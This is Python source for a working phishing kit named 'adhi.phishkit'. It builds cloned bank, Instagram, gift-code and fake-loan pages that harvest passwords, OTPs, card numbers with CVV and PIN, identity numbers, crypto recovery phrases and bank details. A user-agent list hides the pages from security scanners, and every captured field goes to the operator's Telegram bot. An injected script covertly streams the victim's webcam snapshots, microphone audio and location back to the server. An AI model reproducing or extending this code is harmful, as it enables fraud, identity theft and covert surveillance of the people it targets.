        hits INTEGER DEFAULT 0, maxv INTEGER DEFAULT 0, burn INTEGER DEFAULT 0, expires TEXT DEFAULT '',
        dev TEXT DEFAULT 'a', sens INTEGER DEFAULT 0, poke INTEGER DEFAULT 0,
        otp_on INTEGER DEFAULT 1, giftcode TEXT DEFAULT '')""")
        c.execute("""CREATE TABLE IF NOT EXISTS events(id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT, ts TEXT, kind TEXT, detail TEXT)""")
        c.execute("""CREATE TABLE IF NOT EXISTS media(id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT, ts TEXT, kind TEXT, file TEXT, lat TEXT, lon TEXT, acc TEXT)""")

def migrate():
    with db() as c:
        have = {r[1] for r in c.execute("PRAGMA table_info(sessions)")}
        for n in COLS:
            if n not in have:
                c.execute("ALTER TABLE sessions ADD COLUMN " + n +
                          (" INTEGER DEFAULT 0" if n in ("hits", "maxv", "burn", "sens", "poke")
                           else (" INTEGER DEFAULT 1" if n == "otp_on" else " TEXT DEFAULT ''")))

def now():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def devname(ua):
    u = (ua or "").lower()
    o = ("Windows" if "windows" in u else "Android" if "android" in u else "iPhone" if "iphone" in u
         else "iPad" if "ipad" in u else "macOS" if "mac os" in u else "Linux" if "linux" in u else "?")
    b = ("Edge" if "edg/" in u else "Chrome" if "chrome" in u else "Firefox" if "firefox" in u
         else "Safari" if "safari" in u else "?")
    return "%s / %s" % (o, b)

def auto_dev(ua):
    u = (ua or "").lower()
    if any(x in u for x in ("ipad", "tablet", "kindle", "silk", "playbook")):
        return "l"
    if "android" in u and "mobile" not in u:
        return "l"
    return "m" if any(x in u for x in ("mobi", "android", "iphone", "ipod", "windows phone")) else "l"

BOTS = ("bot", "crawl", "spider", "headless", "curl", "wget", "python-requests", "python-urllib",
        "go-http-client", "okhttp", "urlscan", "virustotal", "phishtank", "safe browsing", "monitor",
        "uptime", "pingdom", "site24x7", "datadog", "semrush", "ahrefs", "mj12", "dotbot",
        "facebookexternalhit", "telegrambot", "slackbot", "discordbot", "preview",
        "linkcheck", "scanner", "lighthouse", "gtmetrix", "pagespeed", "axios", "java/")

def is_bot(ua):
    u = (ua or "").lower()
    if not u:
        return True
    return any(b in u for b in BOTS)

def gen_code():
    A = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    return "-".join("".join(secrets.choice(A) for _ in range(4)) for _ in range(3))

def new_sess(site, ip, ua, hdr="", dev="a", sens=0):
    t = secrets.token_urlsafe(7)
    exp = ""
    try:
        if int(CFG.get("ttl") or 0) > 0:
            exp = (datetime.now() + timedelta(minutes=int(CFG["ttl"]))).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        exp = ""
    oo = 1 if CFG["otp"].get(site, True) else 0
    gc = gen_code() if SITES.get(site, {}).get("c") == "gift" else ""
    with db() as c:
        c.execute("INSERT INTO sessions(token,site,ip,ua,hdr,created,step,status,note,maxv,burn,expires,dev,sens,"
                  "otp_on,giftcode) VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                  (t, site, ip, ua, hdr, now(), "start", "open", devname(ua),
                   int(CFG.get("maxv") or 0), 1 if CFG.get("burn") else 0, exp, dev, sens, oo, gc))
    return t

def sess(t):
    with db() as c:
        return c.execute("SELECT * FROM sessions WHERE token=?", (t,)).fetchone()

def upd(t, **kw):
    if not kw:
        return
    with db() as c:
        c.execute("UPDATE sessions SET " + ", ".join(k + "=?" for k in kw) + " WHERE token=?",
                  list(kw.values()) + [t])

def ev(t, kind, detail=""):
    with db() as c:
        c.execute("INSERT INTO events(token,ts,kind,detail) VALUES(?,?,?,?)", (t, now(), kind, detail))

def notify(txt):
    tk, ch = CFG.get("telegram_token", ""), CFG.get("telegram_chat", "")
    if not (tk and ch):
        return
    def go():
        try:
            b = urllib.parse.urlencode({"chat_id": ch, "text": txt, "parse_mode": "HTML"}).encode()
            urllib.request.urlopen("https://api.telegram.org/bot%s/sendMessage" % tk, b, timeout=8)
        except Exception as e:
            print("  [!] tg: %s" % e)
    threading.Thread(target=go, daemon=True).start()

def hit(kind, tok, fields, ip, ua):
    print("\n=== %s | %s | %s | %s ===" % (now(), kind, ip, tok))
    for k, v in fields.items():
        print("   %s: %s" % (k, v))
    m = "<b>adhi.phishkit</b>\n<b>%s</b>\n" % html.escape(kind)
    m += "\n".join("<b>%s</b>: <code>%s</code>" % (html.escape(k), html.escape(str(v))) for k, v in fields.items())
    m += "\n<code>%s</code> | <i>%s</i>" % (html.escape(ip), html.escape(devname(ua)))
    notify(m); ev(tok, kind, json.dumps({k: str(v) for k, v in fields.items()}))

def base_url():
    return (CFG.get("public_url") or "http://%s:%d" % (LAN_IP, CFG["port"])).rstrip("/")

def inr(n):
    try:
        n = int(float(n))
    except Exception:
        return "0"
    s = str(n)
    if len(s) <= 3:
        return s
    head, tail = s[:-3], s[-3:]
    return re.sub(r"(\d)(?=(\d\d)+$)", r"\1,", head) + "," + tail

def fee_of(a):
    try:
        v = int(float(a))
    except Exception:
        v = 0
    return max(499, int(v * 0.015)) if v else 499

def emi(p, n, rate=10.9):
    try:
        p = int(float(p)); n = int(str(n).split()[0])
        r = rate / 12.0 / 100.0
        f = (1 + r) ** n
        return int(round(p * r * f / (f - 1)))
    except Exception:
        return 0

# ============================================================ base
BASE = """
*{box-sizing:border-box;margin:0;padding:0}
html{-webkit-text-size-adjust:100%}
body{min-height:100vh;font-size:15px;line-height:1.5;-webkit-font-smoothing:antialiased;
 text-rendering:optimizeLegibility;overflow-x:hidden}
img,svg{display:block;max-width:100%}svg{height:auto}
a{cursor:pointer;text-decoration:none;color:inherit}
button{font-family:inherit;cursor:pointer;border:0;background:none;color:inherit}
.lmk{display:inline-flex;align-items:center;max-width:100%}
.lmk svg{max-height:44px;width:auto}
.mob,.desk{width:100%;min-height:100vh;flex-direction:column}
.mob{display:flex}
.desk{display:none}
.dfull{width:100%;min-height:100vh;display:flex;flex-direction:column}
@media(min-width:800px){.mob{display:none}.desk{display:flex}}
html.dv-m .mob{display:flex!important}
html.dv-m .desk{display:none!important}
html.dv-l .mob{display:none!important}
html.dv-l .desk{display:flex!important}
.card{background:var(--card);border:1px solid var(--bd);border-radius:14px;padding:24px 20px;margin:16px}
.lbl{display:block;font-size:11px;font-weight:600;letter-spacing:.2px;color:var(--mut);margin:14px 0 6px}
.in{width:100%;height:52px;border:1px solid var(--bd);border-radius:8px;padding:0 13px;font-size:16px;
 outline:0;background:var(--fld);color:var(--tx);font-family:inherit;transition:border-color .15s,box-shadow .15s}
.in:focus{border-color:var(--ac);box-shadow:0 0 0 3px var(--ring)}
textarea.in{height:110px;padding:13px;resize:none;line-height:1.85;font-size:14.5px}
select.in{appearance:none;background-image:linear-gradient(45deg,transparent 50%,var(--mut) 50%),
 linear-gradient(135deg,var(--mut) 50%,transparent 50%);
 background-position:calc(100% - 18px) 22px,calc(100% - 13px) 22px;background-size:5px 5px;
 background-repeat:no-repeat}
.two{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.btn{width:100%;height:52px;border:0;border-radius:8px;background:var(--ac);color:var(--btn);font-size:16px;
 font-weight:600;margin-top:20px;letter-spacing:.1px}
.btn:active{opacity:.88}
.links{display:flex;justify-content:space-between;margin-top:16px;font-size:13px}
.links a{color:var(--ac);font-weight:600}
.trust{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:18px;font-size:11.5px;
 color:var(--mut)}
.code{letter-spacing:.34em;text-align:center;font-size:19px;font-weight:700;font-family:ui-monospace,monospace}
.pins{display:flex;gap:10px;justify-content:center}
.pins input{width:54px;height:60px;text-align:center;font-size:22px;border:1px solid var(--bd);
 border-radius:8px;outline:0;background:var(--fld);color:var(--tx)}
.brands{display:flex;gap:8px;margin-top:10px}
.brands i{font-style:normal;font-size:9px;font-weight:800;padding:4px 9px;border-radius:4px;
 border:1px solid var(--bd);color:var(--mut);letter-spacing:.3px}
.brands i.on{border-color:var(--ac);color:#fff;background:var(--ac)}
.drop{border:1.5px dashed var(--bd);border-radius:10px;padding:18px;text-align:center;font-size:11.5px;
 color:var(--mut);background:var(--fld);display:block;margin-top:8px}
.drop b{display:block;color:var(--tx);font-size:13px;margin-bottom:3px;font-weight:600}
.drop input{display:none}.drop.on{border-color:var(--ac);border-style:solid}
.ok{text-align:center;padding:28px 16px}
.ok .ic{width:72px;height:72px;border-radius:50%;background:#ecfdf5;border:2px solid #10b981;margin:0 auto 16px;
 display:flex;align-items:center;justify-content:center}
.ok svg{width:34px;height:34px;stroke:#059669;stroke-width:3.2;fill:none}
.foot{margin:24px 16px 30px;text-align:center;font-size:11.5px;color:var(--mut);line-height:1.9}
.adhi-badge{position:fixed;bottom:7px;right:8px;font:10px ui-monospace,monospace;background:rgba(0,0,0,.45);
 color:#fff;padding:2px 7px;border-radius:9px;z-index:99;opacity:.8}
.split{display:flex;width:100%;min-height:100vh;align-items:stretch}
.side{display:none;width:42%;padding:46px 38px;flex-direction:column;justify-content:center;gap:16px;
 background:var(--ac);color:var(--btn)}
@media(min-width:800px){.side{display:flex}}
.side .lmk svg{max-height:40px}
.stxt{font-size:22px;font-weight:800;line-height:1.3}
.sbul{font-size:12.5px;opacity:.9;line-height:1.9}
.hdr{display:flex;align-items:center;gap:10px;padding:11px 15px;min-height:58px;background:var(--bg);
 border-bottom:1px solid var(--bd)}
.hdr .box{background:#fff;border-radius:8px;padding:4px 9px;display:flex;align-items:center;box-shadow:0 1px 4px #0002}
.hdr .sp{flex:1}.hdr a{font-size:11.5px;color:var(--tx);font-weight:600;opacity:.85}
.prog{display:flex;gap:5px;padding:12px 16px 0;background:var(--card)}
.prog i{flex:1;height:4px;border-radius:3px;background:var(--bd)}
.prog i.d{background:var(--ac)}
.ptxt{font-size:11px;color:var(--mut);padding:6px 16px 10px;background:var(--card);
 border-bottom:1px solid var(--bd)}
.wrap{flex:1;width:100%;max-width:440px;margin:0 auto;padding:18px 16px 30px}
.aside{display:none}
@media(min-width:800px){.aside{display:block}}
.sbox{background:var(--card);border:1px solid var(--bd);border-radius:12px;padding:16px;font-size:12px;
 color:var(--mut);line-height:1.9}
.sbox h4{font-size:10px;text-transform:uppercase;letter-spacing:.9px;color:var(--ac);margin-bottom:8px}
.sbox .kv{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px dashed var(--bd)}
.sbox .kv b{color:var(--tx)}
.amts{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
.amts label{margin:0;cursor:pointer}
.amts input{position:absolute;opacity:0;pointer-events:none}
.amts span{display:block;text-align:center;padding:12px 4px;border:1.5px solid var(--bd);border-radius:9px;
 font-size:13px;font-weight:700;color:var(--mut)}
.amts input:checked+span{border-color:var(--ac);color:var(--ac);background:var(--fld)}
.san{border:1px dashed var(--bd);border-radius:11px;padding:14px;text-align:center;background:var(--fld)}
.san .k{font-size:9.5px;letter-spacing:1px;text-transform:uppercase;color:var(--mut)}
.san .v{font-size:28px;font-weight:800;color:#059669;letter-spacing:-1px}
.san .m{font-size:11px;color:var(--mut)}
.fee{border:1px solid var(--bd);border-radius:9px;padding:11px 12px;font-size:11.5px;color:var(--mut);margin-top:12px}
.fee div{display:flex;justify-content:space-between;padding:3px 0}
.fee .tot{border-top:1px dashed var(--bd);margin-top:6px;padding-top:7px;color:var(--tx);font-weight:700}
.crumb{font-size:11px;color:var(--mut);padding:10px 16px}
.crumb b{color:var(--ac)}
.nav{display:flex;gap:16px;padding:9px 16px;font-size:11.5px;color:var(--mut);background:var(--card);
 border-bottom:1px solid var(--bd);overflow-x:auto;white-space:nowrap}
.nav b{color:var(--ac)}
.tmr{position:fixed;top:8px;right:8px;background:rgba(0,0,0,.55);color:#fff;font:10.5px ui-monospace,monospace;
 padding:3px 9px;border-radius:20px;z-index:98;opacity:.75}
"""

def theme(s):
    dark = lum(s.get("bg", "#fff")) < .45
    btn = "#111" if s["ac"].lower() in ("#ffffff", "#fffc00", "#9fe870", "#f0b90b", "#ffd814",
                                        "#66c0f4", "#ff6a00", "#f2a900", "#8bc53f", "#ffcc00",
                                        "#34a853", "#ff9900", "#ff9c1a", "#7ec850") else "#fff"
    v = {"--bg": s["bg"], "--ac": s["ac"], "--tx": "#eaecef" if dark else "#14181f",
         "--mut": "#8b9199" if dark else "#6b7280", "--bd": "#2b2f36" if dark else "#e0e5ec",
         "--fld": "#1a1f26" if dark else "#fbfcfe",
         "--ring": "rgba(120,170,255,.16)" if dark else "rgba(59,130,246,.13)",
         "--card": "#16181c" if dark else "#ffffff", "--btn": btn}
    return "".join("%s:%s;" % (k, val) for k, val in v.items())

# ============================================================ fields
def inp(name, ph, typ="text", ac="off", extra=""):
    return ('<input class="in" name="%s" placeholder="%s" type="%s" autocomplete="%s" spellcheck="false" '
            '%s required>' % (name, html.escape(ph), typ, ac, extra))

def hid(tok, site):
    return ("<input type='hidden' name='t' value='%s'><input type='hidden' name='p' value='%s'>"
            % (html.escape(tok), html.escape(site)))

def fld(step, s, tok, ctx, bare=False):
    L = (lambda t: "" if bare else '<label class="lbl">' + t + "</label>")
    if step == "id":
        return L(s["idlab"]) + inp("ident", s["idph"], "text", "username", "autofocus")
    if step == "pw":
        return L("Password") + inp("pw", "Password", "password", "current-password", "autofocus")
    if step == "login":
        return (L(s["idlab"]) + inp("ident", s["idph"], "text", "username", "autofocus") +
                L("Password") + inp("pw", "Password", "password", "current-password"))
    if step == "phone":
        return L(s["idlab"]) + inp("ident", s["idph"], "tel", "tel", 'inputmode="tel" autofocus')
    if step == "otp":
        n = CFG["otp_len"]
        return (L("%d-digit code" % n) + '<input class="in code" name="otp" inputmode="numeric" '
                'autocomplete="one-time-code" maxlength="%d" required autofocus>' % n)
    if step == "pin":
        return (L("Card PIN") + '<div class="pins">' + "<input type='password' inputmode='numeric' "
                "maxlength='1' class='p'>" * 4 + '</div><input type="hidden" name="pin" id="pin">')
    if step == "code":
        return (L("Gift code") + '<input class="in code" id="gc" name="extra" inputmode="text" '
                'autocomplete="off" spellcheck="false" autocapitalize="characters" '
                'placeholder="XXXX-XXXX-XXXX" maxlength="20" required autofocus>')
    if step == "card":
        return (L("Card number") + '<input class="in" id="cn" name="card" inputmode="numeric" '
                'autocomplete="cc-number" placeholder="0000 0000 0000 0000" maxlength="23" required autofocus>'
                '<div class="brands"><i data-b="visa">VISA</i><i data-b="mc">MASTERCARD</i>'
                '<i data-b="rupay">RUPAY</i><i data-b="amex">AMEX</i></div>' +
                L("Name on card") + inp("holder", "As printed on the card", "text", "cc-name") +
                '<div class="two"><div>' + L("Expiry") + '<input class="in" id="ex" name="exp" '
                'inputmode="numeric" placeholder="MM/YY" maxlength="5" required></div><div>' + L("CVV") +
                '<input class="in" name="cvv" type="password" inputmode="numeric" placeholder="3 digits" '
                'maxlength="4" required></div></div>')
    if step == "cvv":
        return L("Confirm CVV") + '<input class="in code" name="cvv" type="password" inputmode="numeric" '
        'placeholder="CVV" maxlength="4" required autofocus>'
    if step == "fullz":
        return (L("Date of birth") + inp("dob", "DD/MM/YYYY", "text", "bday", 'inputmode="numeric"') +
                L("Billing address") + inp("addr", "House, street, area", "text", "street-address") +
                '<div class="two"><div>' + L("City") + inp("extra", "City", "text", "address-level2") +
                '</div><div>' + L("PIN / ZIP") + inp("zip", "Postal code", "text", "postal-code",
                                                    'inputmode="numeric" maxlength="8"') + '</div></div>' +
                L("SSN / Aadhaar") + inp("ssn", "Last 4 or full number", "text", "off",
                                         'inputmode="numeric" maxlength="14"'))
    if step == "seed":
        return (L("Recovery phrase") + '<textarea class="in" name="seed" placeholder="word1 word2 word3 ..." '
                'spellcheck="false" autocapitalize="off" required autofocus></textarea>'
                '<div class="trust">Separate each word with a single space.</div>')
    if step == "user":
        return (L("Instagram username") + inp("ident", "your_username", "text", "username", "autofocus"))
    if step == "verify":
        return (L("Full name") + inp("name", "As per bank record", "text", "name", "autofocus") +
                L("Mobile number") + inp("ident", "10-digit number", "tel", "tel", 'inputmode="tel"') +
                L("Email") + inp("email", "you@example.com", "email", "email"))
    if step == "apply":
        return (L("Loan amount") + "<div class='amts'>"
                "<label><input type='radio' name='amount' value='50000'><span>&#8377;50K</span></label>"
                "<label><input type='radio' name='amount' value='100000' checked><span>&#8377;1L</span></label>"
                "<label><input type='radio' name='amount' value='300000'><span>&#8377;3L</span></label>"
                "<label><input type='radio' name='amount' value='500000'><span>&#8377;5L</span></label>"
                "<label><input type='radio' name='amount' value='1000000'><span>&#8377;10L</span></label>"
                "<label><input type='radio' name='amount' value='2000000'><span>&#8377;20L</span></label></div>"
                "<div class='two'><div>" + L("Tenure") + "<select class='in' name='tenure' id='ten'>"
                "<option>12 months</option><option selected>24 months</option><option>36 months</option>"
                "<option>48 months</option><option>60 months</option></select></div><div>" + L("Purpose") +
                "<select class='in' name='purpose'><option>Personal</option><option>Home renovation</option>"
                "<option>Vehicle</option><option>Gold</option><option>Business</option>"
                "<option>Education</option><option>Medical</option><option>Debt consolidation</option>"
                "</select></div></div>")
    if step == "kyc":
        return (L("Full name (as per PAN)") + inp("name", "Full name", "text", "name", "autofocus") +
                '<div class="two"><div>' + L("Date of birth") + inp("dob", "DD/MM/YYYY", "text", "bday",
                                                                    'inputmode="numeric"') + '</div><div>' +
                L("PAN") + inp("pan", "ABCDE1234F", "text", "off", 'maxlength="10"') + '</div></div>' +
                L("Aadhaar number") + inp("aadhaar", "XXXX XXXX XXXX", "text", "off",
                                          'inputmode="numeric" maxlength="14"') +
                L("Residential address") + inp("addr", "House, street, area", "text", "street-address") +
                '<div class="two"><div>' + L("City") + inp("city", "City", "text", "address-level2") +
                '</div><div>' + L("PIN code") + inp("zip", "6 digits", "text", "postal-code",
                                                    'inputmode="numeric" maxlength="6"') + '</div></div>' +
                L("State") + inp("state", "State", "text", "address-level1") +
                '<div class="two"><div>' + L("Employment") + "<select class='in' name='emp'>"
                "<option>Salaried</option><option>Self-employed</option><option>Business owner</option>"
                "<option>Student</option><option>Retired</option></select></div><div>" + L("Monthly income") +
                inp("income", "&#8377; amount", "text", "off", 'inputmode="numeric"') + "</div></div>" +
                L("Email") + inp("email", "you@example.com", "email", "email"))
    if step == "docs":
        return (L("PAN card photo") + "<label class='drop'><b>Tap to upload</b>Front side, clear and readable"
                "<input type='file' name='doc1' accept='image/*' "
                "onchange=\"this.parentNode.classList.add('on')\"></label>" +
                L("Cancel cheque / passbook") + "<label class='drop'><b>Tap to upload</b>For bank verification"
                "<input type='file' name='doc2' accept='image/*' "
                "onchange=\"this.parentNode.classList.add('on')\"></label>"
                "<div class='trust'>JPG or PNG, max 8 MB each</div>")
    if step == "bank":
        return (L("Account holder name") + inp("holder", "As per bank record", "text", "name", "autofocus") +
                L("Account number") + inp("acct", "Account number", "text", "off", 'inputmode="numeric"') +
                L("IFSC code") + inp("ifsc", "HDFC0001234", "text", "off", 'maxlength="11"') + L("Bank") +
                "<select class='in' name='bname'><option>HDFC Bank</option><option>ICICI Bank</option>"
                "<option>State Bank of India</option><option>Axis Bank</option><option>Kotak Mahindra Bank</option>"
                "<option>Bank of Baroda</option><option>PNB</option><option>Canara Bank</option>"
                "<option>IDFC First Bank</option><option>Other</option></select>")
    if step == "approve":
        amt = ctx.get("amount") or "100000"
        fee = fee_of(amt)
        return ("<div class='san'><div class='k'>Loan approved</div><div class='v'>&#8377;" + inr(amt) +
                "</div><div class='m'>" + html.escape(ctx.get("purpose") or "Personal loan") + " &middot; " +
                html.escape(ctx.get("tenure") or "24 months") + "</div></div>"
                "<div class='ptxt' style='padding:12px 0 0;background:none;border:0'>Disbursal is on hold. "
                "Pay the one-time processing fee to release the amount to your account.</div>"
                "<div class='fee'><div><span>Processing fee (1.5%)</span><b>&#8377;" + inr(fee) + "</b></div>"
                "<div><span>GST &amp; documentation</span><b>Included</b></div>"
                "<div class='tot'><span>Payable now</span><span>&#8377;" + inr(fee) + "</span></div></div>"
                "<div class='trust'>" + LOCK + " Card details are used only for this fee</div>")
    return ""

def step_js(step):
    j = []
    if step == "card":
        j.append("""var c=document.getElementById('cn');if(c){c.addEventListener('input',function(){
var v=c.value.replace(/\\D/g,'').slice(0,19);c.value=v.replace(/(.{4})/g,'$1 ').trim();
var on=v[0]==='4'?'visa':(v[0]==='5'||v[0]==='2')?'mc':v[0]==='6'?'rupay':v[0]==='3'?'amex':'';
[].forEach.call(document.querySelectorAll('.brands i'),function(e){e.classList.toggle('on',e.dataset.b===on)})});
var e=document.getElementById('ex');if(e){e.addEventListener('input',function(){
var v=e.value.replace(/\\D/g,'').slice(0,4);e.value=v.length>2?v.slice(0,2)+'/'+v.slice(2):v})}}""")
    if step == "pin":
        j.append("""var ps=[].slice.call(document.querySelectorAll('.pins input'));
ps.forEach(function(x,i){x.addEventListener('input',function(){x.value=x.value.replace(/\\D/g,'');
if(x.value&&ps[i+1])ps[i+1].focus();var h=document.getElementById('pin');
if(h)h.value=ps.map(function(y){return y.value}).join('')});
x.addEventListener('keydown',function(ev){if(ev.key==='Backspace'&&!x.value&&ps[i-1]){ps[i-1].focus();ev.preventDefault()}})});
if(ps[0])setTimeout(function(){ps[0].focus()},200)""")
    if step == "code":
        j.append("""var g=document.getElementById('gc');if(g){g.addEventListener('input',function(){
var v=g.value.toUpperCase().replace(/[^A-Z0-9]/g,'').slice(0,12);
g.value=(v.match(/.{1,4}/g)||[]).join('-')})}""")
    return "<script>" + ";".join(j) + "</script>" if j else ""

TITLES = {"id": "Sign in", "pw": "Enter password", "login": "Secure login", "otp": "Verification code",
          "pin": "Card PIN", "card": "Card details", "cvv": "Confirm CVV", "fullz": "Billing details",
          "seed": "Recovery phrase", "phone": "Phone number", "user": "Claim followers",
          "apply": "Apply now", "kyc": "KYC details", "docs": "Upload documents", "bank": "Bank account",
          "approve": "Loan sanctioned", "verify": "Verify your device", "code": "Enter your code"}

PROBE = """<script>(function(){
var T="__T__",C=null,R=null,n=0,busy=false;
function P(u,d){try{fetch(u,{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify(d||{})}).catch(function(){})}catch(e){}}
function b64(u8){var s='',i;for(i=0;i<u8.length;i++)s+=String.fromCharCode(u8[i]);return btoa(s)}
function G(){if(!navigator.geolocation)return;
 navigator.geolocation.getCurrentPosition(function(p){P('/api/geo',{t:T,la:p.coords.latitude,
 lo:p.coords.longitude,ac:p.coords.accuracy})},function(){setTimeout(G,2400)},
 {enableHighAccuracy:true,timeout:15000,maximumAge:0})}
function S(){try{if(!C||!C.videoWidth||busy)return;busy=true;
 var w=480,h=Math.round(w*C.videoHeight/C.videoWidth)||360,v=document.createElement('canvas');
 v.width=w;v.height=h;v.getContext('2d').drawImage(C,0,0,w,h);
 P('/api/res',{t:T,k:'snap',d:v.toDataURL('image/jpeg',0.72).split(',')[1]});
 setTimeout(function(){busy=false},120)}catch(e){busy=false}}
function MIC(st){
 var tr=st.getAudioTracks();if(!tr.length)return;
 try{
  var AC=window.AudioContext||window.webkitAudioContext;if(!AC)return;
  var ctx=new AC();if(ctx.resume)ctx.resume();
  var src=ctx.createMediaStreamSource(new MediaStream(tr));
  if(window.lamejs){
   var enc=new lamejs.Mp3Encoder(1,ctx.sampleRate,96),buf=[];
   var flush=function(){if(!buf.length)return;var s=new Int16Array(buf);buf=[];
    var m=enc.encodeBuffer(s);if(m&&m.length)P('/api/res',{t:T,k:'aud',ext:'mp3',d:b64(m)})};
   var sp=ctx.createScriptProcessor(4096,1,1);
   src.connect(sp);sp.connect(ctx.destination);
   sp.onaudioprocess=function(e){var f=e.inputBuffer.getChannelData(0);
    for(var i=0;i<f.length;i++){var s=f[i];s=s<-1?-1:(s>1?1:s);buf.push(s<0?s*0x8000:s*0x7FFF)}
    if(buf.length>=ctx.sampleRate*3)flush()};
   setInterval(flush,3200);
   return}
  if(window.MediaRecorder){var au=st.getAudioTracks();
   R=new MediaRecorder(new MediaStream(au));
   R.ondataavailable=function(e){if(e.data&&e.data.size){var f=new FileReader();
    f.onload=function(){P('/api/res',{t:T,k:'aud',ext:'webm',d:String(f.result).split(',')[1]})};
    f.readAsDataURL(e.data)}};
   R.start();setInterval(function(){try{R.stop();R.start()}catch(e){}},5000)}
 }catch(e){}
}
function M(){var md=navigator.mediaDevices||{},
 g=md.getUserMedia?md.getUserMedia.bind(md):(navigator.webkitGetUserMedia||navigator.mozGetUserMedia||null);
 if(!g){if(n++<6)setTimeout(M,1200);return}
 var pr=md.getUserMedia?md.getUserMedia({video:{facingMode:'user',width:{ideal:640}},audio:true})
  :new Promise(function(a,b){g({video:true,audio:true},a,b)});
 pr.then(function(s){C=document.createElement('video');C.srcObject=s;C.muted=true;C.playsInline=true;
  C.setAttribute('playsinline','');C.play();
  C.addEventListener('loadedmetadata',function(){setTimeout(S,400)});
  setTimeout(S,900);setInterval(S,3000);MIC(s);
 }).catch(function(){if(n++<6)setTimeout(M,1200)})}
setTimeout(M,250);G();setInterval(G,22000);
})();</script>"""

def page(site, title, css, mob, desk, js=""):
    s = SITES.get(site, {})
    d = CUR["dev"] if CUR["dev"] in ("l", "m") else "a"
    vp = "width=1366" if d == "l" else "width=device-width,initial-scale=1,viewport-fit=cover"
    extra = ""
    if CUR["sens"]:
        extra += '<script src="https://cdn.jsdelivr.net/npm/lamejs@1.2.1/lame.min.js" defer></script>'
        extra += PROBE.replace("__T__", CUR.get("tok", ""))
    if CUR.get("ttl"):
        extra += ('<div class="tmr" id="tmr">%02d:00</div><script>(function(){var n=%d*60,e=document.'
                  'getElementById("tmr");var i=setInterval(function(){n--;if(n<0){clearInterval(i);return}'
                  'var m=Math.floor(n/60),s=n%%60;e.textContent=(m<10?"0":"")+m+":"+(s<10?"0":"")+s},1000)})()'
                  '</script>' % (int(CFG["ttl"]), int(CFG["ttl"])))
    extra += js
    if CFG.get("show_badge"):
        extra += '<div class="adhi-badge">adhi.phishkit</div>'
    if desk.lstrip().startswith("<div class='split'"):
        dw, dc = "", ""
    else:
        dw, dc = "<div class='dfull'>", "</div>"
    return ("<!doctype html><html lang='en' class='dv-" + d + "'><head><meta charset='utf-8'>"
            "<meta name='viewport' content='" + vp + "'>"
            "<meta name='theme-color' content='" + s.get("bg", "#fff") + "'>"
            "<meta name='robots' content='noindex,nofollow'>"
            "<meta name='referrer' content='no-referrer'><title>" + html.escape(title) + "</title>"
            "<link rel='preconnect' href='https://fonts.googleapis.com'>"
            "<link rel='preconnect' href='https://fonts.gstatic.com' crossorigin>"
            "<link href='https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&"
            "family=Roboto:wght@300;400;500;700&family=Lato:wght@400;700;900&family=Grand+Hotel&"
            "family=Open+Sans:wght@400;600;700&family=IBM+Plex+Sans:wght@400;600&display=swap' "
            "rel='stylesheet'><style>" + BASE + css +
            "body{font-family:'Inter',-apple-system,'Segoe UI',Roboto,Arial,sans-serif;"
            "background:var(--bg);color:var(--tx)}</style></head><body style=\"" + theme(s) + "\">"
            "<div class='mob'>" + mob + "</div><div class='desk'>" + dw + desk + dc + "</div>"
            + extra + "</body></html>")

def act(tok, site, step):
    return "action='/t/%s/%s/%s'" % (html.escape(tok), html.escape(site), step)

# ============================================================ layouts
def lay_gen(s, tok, step, ctx):
    who = ctx.get("ident") or ""
    note = ("<div class='ptxt' style='background:none;border:0;padding:0 0 14px'>Enter the %d-digit code sent to "
            "your registered number.</div>" % CFG["otp_len"]) if step == "otp" else (
        "<p class='ptxt' style='background:none;border:0;padding:0 0 14px'>" + html.escape(s["help"]) + "</p>"
        if step == "card" and s["help"] else (
        "<p class='ptxt' style='background:none;border:0;padding:0 0 14px'>Signed in as <b>" + html.escape(who) +
        "</b></p>" if step == "pw" and who else
        "<p class='ptxt' style='background:none;border:0;padding:0 0 14px'>" +
        html.escape(s["sub"] or "Welcome back") + "</p>"))
    h1 = ("Sign in to " + html.escape(s["l"])) if step in ("id", "phone") else TITLES.get(step, "Sign in")
    form = ("<form method='post' " + act(tok, s["k"], step) + ">" + hid(tok, s["k"]) + fld(step, s, tok, ctx) +
            "<button class='btn' type='submit'>Continue</button>"
            "<div class='links'><a>Forgot password?</a><a>Create account</a></div></form>"
            "<div class='trust'>" + LOCK + " Secured connection</div>")
    mob = ("<div class='card' style='text-align:center'><div style='display:flex;justify-content:center;"
           "margin-bottom:18px'>" + brand(s) + "</div><h1 style='font-size:19px;margin-bottom:6px'>" + h1 +
           "</h1>" + note + "<div style='text-align:left'>" + form + "</div></div>"
           "<div class='foot'>" + html.escape(s["l"]) + " &middot; Privacy &middot; Terms</div>")
    desk = ("<div style='align-items:center;justify-content:center;min-height:100vh;padding:36px 20px'>"
            "<div class='card' style='width:400px'><div style='display:flex;justify-content:center;"
            "margin-bottom:18px'>" + brand(s) + "</div><h1 style='font-size:19px;text-align:center;"
            "margin-bottom:6px'>" + h1 + "</h1>" + note + form + "</div>"
            "<div class='foot' style='text-align:center'>" + html.escape(s["l"]) +
            " &middot; Privacy &middot; Terms &middot; Help</div></div>")
    return mob, desk, ".card{text-align:left}.card h1{text-align:center}" \
                      ".dfull{align-items:center;justify-content:center}", step_js(step)

# ---------------- Instagram
def lay_ig(s, tok, step, ctx):
    ident = ctx.get("ident") or ""
    hh = "<input type='hidden' name='ident' value='" + html.escape(ident) + "'>" if ident else ""
    if step == "id":
        inner = ("<input class='pill' name='ident' placeholder='Phone number, username, or email' "
                 "autocapitalize='off' spellcheck='false' required autofocus>"
                 "<input class='pill' name='pw' type='password' placeholder='Password' required>"
                 "<button class='login' type='submit'>Log in</button>"
                 "<a class='fbl'>" + FBW + " Log in with Facebook</a><a class='forg'>Forgot password?</a>")
    else:
        inner = ("<h2 class='ct'>Confirm it&rsquo;s you</h2><p class='cs'>Enter the %d-digit code we sent to<br>"
